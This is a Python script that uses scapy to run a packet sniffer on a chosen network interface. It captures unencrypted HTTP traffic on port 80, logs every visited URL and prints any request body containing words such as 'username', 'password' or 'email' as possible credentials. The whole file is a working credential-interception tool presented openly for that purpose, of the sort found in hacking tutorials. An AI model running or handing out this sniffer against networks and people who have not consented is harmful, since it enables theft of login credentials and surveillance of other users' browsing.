#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers.http import HTTPRequest  # Import HTTP layer
import argparse

# python3 packetSniffer.py -i enp0s3

def get_arguments():
    parser = argparse.ArgumentParser(description="Packet sniffer to extract URLs and HTTP credentials")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to sniff")
    args = parser.parse_args()
    return args

def sniff(interface):
    """
    Sniff network packets on the specified interface.
    """
    try:
        print(f"[*] Starting packet sniffing on interface: {interface}")
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp port 80")
    except Exception as e:
        print(f"[ERROR] Failed to start sniffing: {e}")


def get_url(packet):
    """
    Extract the URL from an HTTP request packet.
    """
    try:
        host = packet[HTTPRequest].Host.decode() if packet[HTTPRequest].Host else "[Unknown Host]"
        path = packet[HTTPRequest].Path.decode() if packet[HTTPRequest].Path else "[Unknown Path]"
        return f"http://{host}{path}"
    except Exception as e:
        print(f"[ERROR] Failed to extract URL: {e}")
        return "[Error Extracting URL]"


def get_credentials(packet):
    """
    Extract possible login credentials from an HTTP packet payload.
    """
    try:
        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load.decode(errors="ignore")
            keywords = ["username", "user", "login", "password", "pass", "email"]
            for keyword in keywords:
                if keyword in payload:
                    return payload
    except Exception as e:
        print(f"[ERROR] Failed to extract credentials: {e}")
    return None


def process_sniffed_packet(packet):
    """
    Process sniffed packets to extract and display URLs and credentials.
    """
    try:
        if packet.haslayer(HTTPRequest):
            url = get_url(packet)
            print(f"[+] HTTP Request: {url}")

            credentials = get_credentials(packet)
            if credentials:
                print(f"\n[!] Possible Credentials Found: {credentials}\n")
    except Exception as e:
        print(f"[ERROR] Failed to process packet: {e}")


if __name__ == "__main__":
    args = get_arguments()
    sniff(args.interface)

